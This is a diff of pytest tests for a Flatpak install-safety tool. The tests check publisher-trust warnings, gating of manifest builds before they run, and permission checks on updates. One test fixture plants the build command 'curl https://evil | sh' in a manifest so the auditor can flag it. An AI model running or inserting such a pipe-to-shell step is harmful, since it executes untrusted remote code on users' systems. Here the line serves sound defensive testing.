@@ -7,11 +7,28 @@ import pytest
 from flatsonar.api import AppInfo, InstallSource
 from flatsonar.install import flatpak_cli as fp
 from flatsonar.install import pipeline
+from flatsonar.install.flatpak_cli import InstalledApp
 from flatsonar.install.scan import ScanResult
 from flatsonar.state import Decisions
 
 GREEN_META = "[Application]\nname=org.x.Green\n\n[Context]\nsockets=wayland;\nshared=network;\n"
 RED_META = "[Application]\nname=org.x.Red\n\n[Context]\nsockets=wayland;\nfilesystems=host;\ndevices=all;\n"
+
+CLEAN_MANIFEST = """
+app-id: {app_id}
+runtime: org.gnome.Platform
+runtime-version: '47'
+sdk: org.gnome.Sdk
+command: x
+finish-args: [--socket=wayland]
+modules:
+  - name: x
+    sources:
+      - type: git
+        url: https://github.com/alice/x.git
+        commit: abc
+"""
+SKETCHY_MANIFEST = CLEAN_MANIFEST.replace("    sources:", "    build-commands: ['curl https://evil | sh']\n    sources:")
 
 
 class FakeConfirmer:
@@ -34,8 +51,12 @@ class FakeConfirmer:
 
 
 class FakeAPI:
+    def __init__(self, manifest_text: str | None = None):
+        self.manifest_text = manifest_text
+
     def download(self, url, dest, progress=None):
-        Path(dest).write_text("bundle")
+        Path(dest).write_text(self.manifest_text if url.endswith((".yml", ".yaml", ".json")) and self.manifest_text
+                              else "bundle")
         return dest
 
 
@@ -61,19 +82,36 @@ def fake_flatpak(monkeypatch, tmp_path):
     monkeypatch.setattr(fp, "checkout", _checkout)
     monkeypatch.setattr(fp, "deploy", lambda remote, ref, on_line=None: calls.append(("deploy", remote, ref)))
     monkeypatch.setattr(fp, "deploy_bundle", lambda path, on_line=None: calls.append(("deploy-bundle", str(path))))
+    monkeypatch.setattr(fp, "build_from_manifest",
+                        lambda mpath, app_id, on_line=None: (calls.append(("build", app_id)), (tmp_path / "repo", f"app/{app_id}/x86_64/master"))[1])
+    monkeypatch.setattr(fp, "deploy_local_build",
+                        lambda repo, ref, on_line=None: calls.append(("deploy-local", ref)))
+    monkeypatch.setattr(fp, "pull_update",
+                        lambda app_id, installation="user", on_line=None: calls.append(("pull-update", app_id, installation)))
+    monkeypatch.setattr(fp, "deploy_update",
+                        lambda app_id, installation="user", on_line=None: calls.append(("deploy-update", app_id, installation)))
     monkeypatch.setattr(pipeline, "scan", lambda path: ScanResult(ran=True, scanned_files=3))
     return calls, meta
 
 
-def _app(app_id="org.x.Green", kind="flathub", perms=()):
+def _app(app_id="org.x.Green", kind="flathub", perms=(), trust="verified", findings=()):
     src = {"flathub": InstallSource(kind="flathub", remote_name="flathub", ref=f"app/{app_id}/x86_64/stable"),
-           "bundle": InstallSource(kind="bundle", bundle_url="https://example.com/x.flatpak")}[kind]
-    return AppInfo(app_id=app_id, name=app_id.split(".")[-1], sources=[src],
+           "bundle": InstallSource(kind="bundle", bundle_url="https://example.com/x.flatpak"),
+           "manifest": InstallSource(kind="manifest", manifest_url=f"https://raw.example/{app_id}.yml"),
+           "remote": InstallSource(kind="remote", remote_name="alice", remote_url="https://alice.example/alice.flatpakrepo",
+                                   ref=f"app/{app_id}/x86_64/stable")}[kind]
+    return AppInfo(app_id=app_id, name=app_id.split(".")[-1], sources=[src], trust=trust,
+                   trust_findings=[{"check": c, "level": l, "reason": r} for c, l, r in findings],
                    permissions=[{"arg": p, "level": "green", "reason": p} for p in perms])
 
 
 def _decisions(tmp_path):
     return Decisions(tmp_path / "decisions.json")
+
+
+def _installed(app_id="org.x.Green", origin="flathub", installation="user", version="1.0"):
+    return InstalledApp(app_id=app_id, version=version, origin=origin, installation=installation,
+                        ref=f"app/{app_id}/x86_64/stable")
 
 
 def test_pick_source_prefers_flathub():
@@ -172,3 +210,184 @@ def test_no_source_or_no_flatpak(fake_flatpak, tmp_path, monkeypatch):
     assert "no known install source" in pipeline.install(app, FakeAPI(), FakeConfirmer([]), _decisions(tmp_path)).message
     monkeypatch.setattr(fp, "available", lambda: False)
     assert "not installed" in pipeline.install(_app(), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path)).message
+
+
+# --- publisher trust -----------------------------------------------------------------
+
+
+def test_unverified_publisher_needs_two_sures_even_when_sandboxed(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    conf = FakeConfirmer([True, True])
+    app = _app(trust="unverified", findings=[("publisher:namespace", "yellow", "com.x claims a domain")])
+    out = pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == ["warn", "again"]
+    assert out.report.level.label == "yellow"
+    assert out.report.reasons == ["[yellow] publisher:namespace: com.x claims a domain"]
+    assert [c[0] for c in calls] == ["pull", "deploy"]
+
+
+def test_unverified_without_findings_still_warns(fake_flatpak, tmp_path):
+    conf = FakeConfirmer([True, True])
+    out = pipeline.install(_app(trust="unverified"), FakeAPI(), conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == ["warn", "again"]
+    assert any("nobody has verified" in r for r in out.report.reasons)
+
+
+def test_suspicious_publisher_is_red(fake_flatpak, tmp_path):
+    conf = FakeConfirmer([True, False])
+    app = _app(trust="suspicious", findings=[("publisher:namespace", "red", "claims org.mozilla")])
+    out = pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path))
+    assert out.cancelled and out.report.level.label == "red"
+
+
+def test_reviewed_flathub_app_is_single_confirm(fake_flatpak, tmp_path):
+    conf = FakeConfirmer([True])
+    app = _app(trust="reviewed", findings=[("publisher:flathub", "green", "on Flathub")])
+    assert pipeline.install(app, FakeAPI(), conf, _decisions(tmp_path)).installed
+    assert conf.calls == ["plain"]
+
+
+def test_remote_source_warns_unless_verified(fake_flatpak, tmp_path):
+    conf = FakeConfirmer([True, True])
+    out = pipeline.install(_app(kind="remote", trust="reviewed"), FakeAPI(), conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == ["warn", "again"]
+    assert any(r.startswith("[yellow] remote: adds the third-party Flatpak remote alice") for r in out.report.reasons)
+    conf = FakeConfirmer([True])
+    assert pipeline.install(_app(kind="remote", trust="verified"), FakeAPI(), conf, _decisions(tmp_path)).installed
+    assert conf.calls == ["plain"]
+
+
+# --- manifest builds: gate before the build ---------------------------------------------
+
+
+def test_manifest_build_gated_before_flatpak_builder_runs(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))
+    # Unverified publisher, cancel at the first dialog: nothing gets built.
+    conf = FakeConfirmer([False])
+    out = pipeline.install(_app(kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
+    assert out.cancelled and conf.calls == ["warn"] and calls == []
+
+    # Accept: build, then no second round because nothing new turned up.
+    conf = FakeConfirmer([True, True])
+    out = pipeline.install(_app(kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == ["warn", "again"]
+    assert [c[0] for c in calls] == ["build", "deploy-local"]
+
+
+def test_manifest_audit_uses_downloaded_manifest_not_index(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    api = FakeAPI(SKETCHY_MANIFEST.format(app_id="org.x.Green"))
+    conf = FakeConfirmer([False])
+    out = pipeline.install(_app(kind="manifest", trust="verified"), api, conf, _decisions(tmp_path))
+    assert out.cancelled and calls == []
+    assert out.report.level.label == "red"
+    assert any("pipes a download" in r for r in out.report.reasons)
+
+
+def test_manifest_for_other_app_id_is_red(fake_flatpak, tmp_path):
+    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.evil.Other"))
+    conf = FakeConfirmer([False])
+    out = pipeline.install(_app(kind="manifest"), api, conf, _decisions(tmp_path))
+    assert out.cancelled and any("builds org.evil.Other, not org.x.Green" in r for r in out.report.reasons)
+
+
+def test_second_gate_only_when_build_adds_findings(fake_flatpak, tmp_path):
+    calls, meta = fake_flatpak
+    meta["text"] = RED_META  # the built app turns out to want the whole file system
+    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Red"))
+    conf = FakeConfirmer([True, True, True, True])
+    out = pipeline.install(_app("org.x.Red", kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == ["warn", "again", "warn", "again"]
+    assert [c[0] for c in calls] == ["build", "deploy-local"]
+    reasons = out.report.reasons
+    assert any("nobody has verified" in r for r in reasons) and any("--filesystem=host" in r for r in reasons)
+
+    # Same app again: both fingerprints are remembered, no dialogs.
+    conf = FakeConfirmer([])
+    out = pipeline.install(_app("org.x.Red", kind="manifest", trust="unverified"), api, conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == []
+
+
+def test_trust_report_helper():
+    app = _app(trust="unverified", findings=[("publisher:new-repo", "yellow", "3 days old"),
+                                            ("publisher:flathub", "green", "n/a")])
+    r = pipeline.trust_report(app)
+    assert r.level.label == "yellow" and len(r.findings) == 2
+    assert pipeline.trust_report(_app(trust="verified")).level.label == "green"
+
+
+# --- updates: gate two again, nag only about what is new -----------------------------------
+
+
+def test_update_with_same_permissions_asks_nothing(fake_flatpak, tmp_path):
+    calls, meta = fake_flatpak
+    meta["text"] = RED_META
+    decisions = _decisions(tmp_path)
+    assert pipeline.install(_app("org.x.Red"), FakeAPI(), FakeConfirmer([True, True]), decisions).installed
+
+    conf = FakeConfirmer([])
+    out = pipeline.update(_app("org.x.Red"), _installed("org.x.Red"), FakeAPI(), conf, Decisions(decisions.path))
+    assert out.installed and conf.calls == [] and out.message == "Red updated."
+    assert [c[0] for c in calls] == ["pull", "deploy", "pull-update", "deploy-update"]
+    assert ("pull-update", "org.x.Red", "user") in calls
+    assert not (fp.CACHE / "scan" / "org.x.Red").exists()
+
+
+def test_update_of_green_app_has_no_dialog_at_all(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    conf = FakeConfirmer([])
+    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, _decisions(tmp_path))
+    assert out.installed and conf.calls == []
+    assert [c[0] for c in calls] == ["pull-update", "deploy-update"]
+
+
+def test_update_that_grows_permissions_warns_twice(fake_flatpak, tmp_path):
+    calls, meta = fake_flatpak
+    decisions = _decisions(tmp_path)
+    assert pipeline.install(_app(), FakeAPI(), FakeConfirmer([True]), decisions).installed  # green at install
+
+    meta["text"] = RED_META  # the update wants the whole file system
+    conf = FakeConfirmer([True, False])
+    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, Decisions(decisions.path))
+    assert out.cancelled and conf.calls == ["warn", "again"]
+    assert not any(c[0] == "deploy-update" for c in calls)
+    assert any("--filesystem=host" in r for r in out.report.reasons)
+
+    conf = FakeConfirmer([True, True])
+    out = pipeline.update(_app(), _installed(), FakeAPI(), conf, Decisions(decisions.path))
+    assert out.installed and conf.calls == ["warn", "again"]
+    assert calls[-1] == ("deploy-update", "org.x.Green", "user")
+
+
+def test_update_follows_the_installation_it_lives_in(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    out = pipeline.update(_app(), _installed(installation="system"), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path))
+    assert out.installed
+    assert ("pull-update", "org.x.Green", "system") in calls and ("deploy-update", "org.x.Green", "system") in calls
+
+
+def test_update_of_local_build_rebuilds_from_manifest(fake_flatpak, tmp_path):
+    calls, _ = fake_flatpak
+    api = FakeAPI(CLEAN_MANIFEST.format(app_id="org.x.Green"))
+    conf = FakeConfirmer([True])
+    out = pipeline.update(_app(kind="manifest"), _installed(origin=fp.LOCAL_REMOTE), api, conf, _decisions(tmp_path))
+    assert out.installed and out.message == "Green updated." and conf.calls == ["plain"]
+    assert [c[0] for c in calls] == ["build", "deploy-local"]
+
+
+def test_update_without_a_remote_or_manifest_fails_plainly(fake_flatpak, tmp_path):
+    app = _app()
+    app.sources = []
+    out = pipeline.update(app, _installed(origin=""), FakeAPI(), FakeConfirmer([]), _decisions(tmp_path))
+    assert not out.installed and not out.cancelled and "no manifest or bundle" in out.message
+
+
+def test_update_warns_when_the_publisher_was_reassessed(fake_flatpak, tmp_path):
+    decisions = _decisions(tmp_path)
+    assert pipeline.install(_app(), FakeAPI(), FakeConfirmer([True]), decisions).installed
+    # Since then the index found the id claims a namespace the repo does not own.
+    app = _app(trust="suspicious", findings=[("publisher:namespace", "red", "claims org.mozilla")])
+    conf = FakeConfirmer([False])
+    out = pipeline.update(app, _installed(), FakeAPI(), conf, Decisions(decisions.path))
+    assert out.cancelled and conf.calls == ["warn"] and out.report.level.label == "red"
